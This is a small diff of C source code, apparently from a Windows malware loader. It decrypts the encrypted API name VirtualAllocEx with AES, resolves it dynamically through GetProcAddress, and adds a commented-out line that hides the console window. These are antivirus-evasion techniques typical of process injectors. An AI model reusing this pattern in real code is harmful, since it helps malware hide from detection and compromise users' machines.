@@ -48,6 +48,7 @@ int AESDecrypt(char* cipherText, unsigned int ct_len, char* key, size_t keylen)
 }
 
 void main(void) {
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 	VirtAllocEx VAE;
 	AESDecrypt((char*)VirtualAllocEx_ct, sizeof(VirtualAllocEx_ct), (char*)VirtualAllocEx_key, sizeof(VirtualAllocEx_key));
 	VAE = (VirtAllocEx)GetProcAddress(GetModuleHandleA("kernel32.dll"), (char*)VirtualAllocEx_ct);
